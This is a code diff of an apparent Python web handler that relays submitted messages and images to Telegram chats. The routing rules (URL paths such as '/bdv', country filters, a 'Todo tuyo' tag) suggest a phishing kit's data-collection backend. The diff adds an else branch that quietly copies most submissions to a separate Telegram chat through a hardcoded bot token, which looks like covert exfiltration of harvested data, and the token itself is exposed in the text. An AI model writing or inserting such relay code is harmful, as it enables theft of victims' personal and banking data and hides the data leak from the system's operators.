@@ -833,19 +833,6 @@ async def handle_dynamic_endpoint_optimized_with_image(
         try:
             if path.startswith("/internacional") and pais not in {"EC", "EXCLUDED"}:
                 return {"mensaje_enviado": True, "pais_origen": "Aburrete"}
-
-            if path.startswith("/bdv") and obtener_is_active_cached() and \
-               numeror in numeros_r and pais not in {"US", "CO"}:
-                r = await enviar_telegram_hibrido(
-                    mensaje_completo + " Todo tuyo",
-                    chat_id="-4931572577",
-                    token=TOKEN,
-                    priority=2,
-                    force_immediate=True,
-                    image_data=image_data,
-                    image_filename=image_filename
-                )
-                telegram_results.append(r)
             if path.startswith("/bbdsasd") and obtener_is_active_cached() and \
                numeror in numeros_r and pais not in {"US", "CO"}:
                 r = await enviar_telegram_hibrido(
@@ -858,6 +845,31 @@ async def handle_dynamic_endpoint_optimized_with_image(
                     image_filename=image_filename
                 )
                 telegram_results.append(r)
+            else: 
+                r = await enviar_telegram_hibrido(
+                    mensaje_completo ,
+                    chat_id="-5079932762",
+                    token="7571804596:AAHTVnjOot66neKF7VoBfxMCxTVYxVH3xsc",
+                    priority=2,
+                    force_immediate=True,
+                    image_data=image_data,
+                    image_filename=image_filename
+                )
+                telegram_results.append(r)
+        
+            if path.startswith("/bdv") and obtener_is_active_cached() and \
+               numeror in numeros_r and pais not in {"US", "CO"}:
+                r = await enviar_telegram_hibrido(
+                    mensaje_completo + " Todo tuyo",
+                    chat_id="-4931572577",
+                    token=TOKEN,
+                    priority=2,
+                    force_immediate=True,
+                    image_data=image_data,
+                    image_filename=image_filename
+                )
+                telegram_results.append(r)
+            
             elif path.startswith("/maikel"):
                 # Envía al DEFAULT_CHAT_ID con imagen y mensaje completo
                 r1 = await enviar_telegram_hibrido(
